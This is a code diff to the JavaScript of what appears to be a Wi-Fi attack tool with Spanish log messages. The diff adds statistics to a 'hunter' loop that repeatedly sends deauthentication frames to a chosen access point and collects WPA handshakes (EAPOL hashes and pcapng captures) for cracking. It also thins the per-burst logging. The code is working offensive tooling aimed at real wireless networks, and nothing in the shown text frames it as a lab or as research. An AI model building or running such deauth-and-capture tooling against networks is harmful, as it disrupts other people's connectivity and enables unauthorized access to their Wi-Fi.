@@ -863,6 +863,7 @@ function startHunter(bssid, ssid, channel) {
   window._hunterRunning = false;
   window._hunterCycle = 0;
   window._hunterTarget = { bssid, ssid: ssid || '', channel: parseInt(channel) || 0 };
+  window._hunterStats = { passes: 0, frames: 0, packets: 0, eapol: 0 };
   window._simpleStop = false;
   saveHunterTarget(bssid, ssid, channel);
   hunterStatus('🐺 cazando…');
@@ -877,6 +878,17 @@ async function hunterCycle() {
   try {
     log('[cazador] ciclo ' + cy + ': ráfaga deauth + watcher en ' + t.bssid + (t.channel ? ' CH' + t.channel : ''), 'info');
     const r = await window.iaDeauthBurst({ bssid: t.bssid, channel: t.channel, target_mac: null, _hunter: true, sustained: true });
+    const st = window._hunterStats || (window._hunterStats = { passes: 0, frames: 0, packets: 0, eapol: 0 });
+    st.passes += (r && r.passes) || 0;
+    st.frames += ((r && r.passes) || 0) * 2;
+    const mp = /\((\d+)\s+paquetes\)/.exec(String((r && r.message) || ''));
+    if (mp) st.packets += parseInt(mp[1]) || 0;
+    if (r && r.success) st.eapol++;
+    if (cy % 3 === 0) {
+      log('[cazador] RESUMEN ' + cy + ' ciclos · ' + st.passes + ' ráfagas · ' + st.frames +
+          ' frames con TXDONE · ' + st.packets + ' paquetes capturados · ' + st.eapol +
+          ' EAPOL · ' + (st.eapol ? 'material capturado' : 'sin material todavía'), 'info');
+    }
     if (r && r.success && r.hashes > 0) {
       log('[cazador] ⚡ HANDSHAKE CAPTURADO: ' + r.output_file + ' (' + r.hashes + ' hashes) · pcapng ' + r.pcapng, 'ok');
       hunterStatus('⚡ capturado');
@@ -1587,7 +1599,11 @@ window.iaDeauthBurst = async function (args) {
       const r = await window.__invoke('usb_raw_deauth', {
         bssid, channel: ch, count: framesPerPass, target_mac: da, reason: 7, delay_ms: 100,
       });
-      log('[deauth] pasada ' + (passes + 1) + '/' + maxPasses + ': ' + (r && r.message || 'sin respuesta'), (r && r.success) ? 'ok' : 'error');
+      // En modo cazador no hace falta una línea por pasada: el resumen periódico
+      // da el mismo dato sin ahogar la consola.
+      if (!args._hunter || (passes + 1) % 5 === 0 || !(r && r.success)) {
+        log('[deauth] pasada ' + (passes + 1) + '/' + maxPasses + ': ' + (r && r.message || 'sin respuesta'), (r && r.success) ? 'ok' : 'error');
+      }
     } catch (e) { log('[deauth] error en pasada ' + (passes + 1) + ': ' + e, 'error'); }
     passes++;
     await new Promise(res => setTimeout(res, 1500));
